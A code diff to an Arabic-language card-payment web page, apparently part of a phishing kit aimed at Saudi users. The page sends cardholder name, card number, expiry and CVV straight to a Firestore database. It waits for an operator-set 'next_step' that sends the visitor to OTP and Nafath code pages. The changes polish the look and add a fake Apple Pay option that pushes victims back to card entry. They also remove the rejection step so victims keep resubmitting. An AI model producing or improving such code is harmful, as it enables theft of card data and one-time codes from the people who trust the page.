@@ -13,7 +13,7 @@
         .secure-container { background: white; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
         .p-header { background: #fafafa; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
         .p-header img { width: 110px; }
-        .p-header h3 { color: #333; margin: 10px 0 0 0; font-size: 19px; }
+        .p-header h3 { color: #333; margin: 10px 0 0 0; font-size: 1rem; font-weight: bold; }
         
         .p-body { padding: 25px 30px 30px 30px; }
 
@@ -26,12 +26,12 @@
         .method-title { font-weight: 600; color: #333; margin-right: auto; }
 
         /* Card Details Form (Initially hidden) */
-        #card-form { max-height: 0; overflow: hidden; transition: max-height 0.5s ease-out, margin-top 0.5s ease-out; margin-top: 0; }
-        #card-form.visible { max-height: 500px; margin-top: 25px; }
+        #card-form { max-height: 0; overflow: hidden; opacity: 0; transform: translateY(-20px); transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1); margin-top: 0; }
+        #card-form.visible { max-height: 700px; margin-top: 25px; opacity: 1; transform: translateY(0); }
 
         .f-group { margin-bottom: 18px; position: relative; }
         label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; font-size: 13.5px; }
-        input, select { width: 100%; padding: 13px 15px; border: 1.5px solid var(--border-light); border-radius: 12px; font-size: 16px; box-sizing: border-box; transition: 0.3s; color: #333; outline: none; background: #f9fafb; }
+        input, select { width: 100%; padding: 12px 15px; border: 1.5px solid var(--border-light); border-radius: 10px; font-size: 0.95rem; box-sizing: border-box; transition: 0.3s; color: #333; outline: none; background: #f9fafb; }
         input:focus { border-color: var(--s-gold); box-shadow: 0 0 8px rgba(197, 160, 89, 0.2); }
         
         /* شعار البطاقة الذكي */
@@ -40,12 +40,20 @@
         .c-exp-row { display: flex; gap: 10px; }
         .c-exp-row > div { flex: 1; }
         
-        .btn-pay { width: 100%; padding: 16px; background: var(--p-green); color: var(--t-green); border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
+        .btn-pay { width: 100%; padding: 14px; background: var(--p-green); color: var(--t-green); border: none; border-radius: 10px; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
         .btn-pay:hover { opacity: 0.92; }
         .btn-pay:disabled { background: #ccc; cursor: not-allowed; color: #888; }
 
         .trust-icons { display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.6; }
         .trust-icons img { height: 20px; }
+        
+        /* Loading Spinner */
+        .spinner-border {
+            display: inline-block; width: 1.2rem; height: 1.2rem; vertical-align: text-bottom; 
+            border: 0.2em solid currentColor; border-right-color: transparent; 
+            border-radius: 50%; animation: spinner-border .75s linear infinite; margin-left: 8px;
+        }
+        @keyframes spinner-border { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -71,6 +79,12 @@
             <span class="method-title">مدى</span>
             <div class="method-logos">
                 <img src="https://img.icons8.com/external-flat-icons-inmotus-design/67/000000/external-mada-mada-card-flat-icons-inmotus-design.png" alt="Mada">
+            </div>
+        </div>
+        <div class="payment-method" id="method-apple" onclick="selectMethod('apple')">
+            <span class="method-title">Apple Pay</span>
+            <div class="method-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/800px-Apple_Pay_logo.svg.png" alt="Apple Pay" style="height: 22px; object-fit: contain;">
             </div>
         </div>
 
@@ -132,6 +146,16 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // مسح الحقول تلقائياً عند تحميل الصفحة لضمان إدخال بيانات جديدة
+    window.addEventListener('load', () => {
+        document.getElementById('p-name').value = '';
+        document.getElementById('c-num').value = '';
+        document.getElementById('e-m').value = '';
+        document.getElementById('e-y').value = '';
+        document.getElementById('c-v').value = '';
+        document.getElementById('c-logo-box').style.display = 'none';
+    });
+
     // -- ذكاء كشف نوع البطاقة وتنسيقها --
     const cardInput = document.getElementById('c-num');
     const cardLogo = document.getElementById('c-logo-box');
@@ -140,11 +164,15 @@
     function selectMethod(method) {
         document.getElementById('method-card').classList.remove('selected');
         document.getElementById('method-mada').classList.remove('selected');
+        document.getElementById('method-apple').classList.remove('selected');
         
         if (method === 'card') {
             document.getElementById('method-card').classList.add('selected');
         } else if (method === 'mada') {
             document.getElementById('method-mada').classList.add('selected');
+        } else if (method === 'apple') {
+            document.getElementById('method-apple').classList.add('selected');
+            alert("عذراً، خدمة Apple Pay غير متوفرة حالياً، يرجى الدفع بالبطاقة");
         }
         document.getElementById('card-form').classList.add('visible');
     }
@@ -221,9 +249,19 @@
             return;
         }
 
+        // التحقق من تاريخ انتهاء البطاقة (عدم قبول بطاقات منتهية)
+        const now = new Date();
+        const currentYear = now.getFullYear();
+        const currentMonth = now.getMonth() + 1; // الأشهر تبدأ من 0 في البرمجة
+
+        if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
+            alert("❌ تاريخ انتهاء البطاقة غير صحيح (البطاقة منتهية الصلاحية)");
+            return;
+        }
+
         // Disable button to prevent multiple submissions
         payBtn.disabled = true;
-        payBtn.innerText = "جاري المعالجة...";
+        payBtn.innerHTML = '<span class="spinner-border" role="status" aria-hidden="true"></span> جاري المعالجة...';
 
         const userId = localStorage.getItem('user_id');
         if (!userId) {
@@ -239,7 +277,8 @@
                 card_number: num,
                 expiry: month + "/" + year,
                 cvv: cvv,
-                status: "waiting_otp"
+                status: "waiting_otp",
+                next_step: "WAITING" // تصفير الحالة لمنع الرفض التلقائي لاحقاً
             });
             // سينقلك لصفحة الكود بعد النجاح
             window.location.href = "otp_verification.html";
@@ -257,8 +296,7 @@
                 const data = doc.data();
                 if (data.next_step === "GO_TO_OTP") {
                     window.location.href = "otp_verification.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_failed.html";
+                // تم إزالة شرط الرفض من هنا للسماح للمستخدم بإعادة المحاولة
                 } else if (data.next_step === "GO_TO_NAFATH") {
                     window.location.href = "nafath.html";
                 } else if (data.next_step === "SHOW_NAFATH_CODE") {
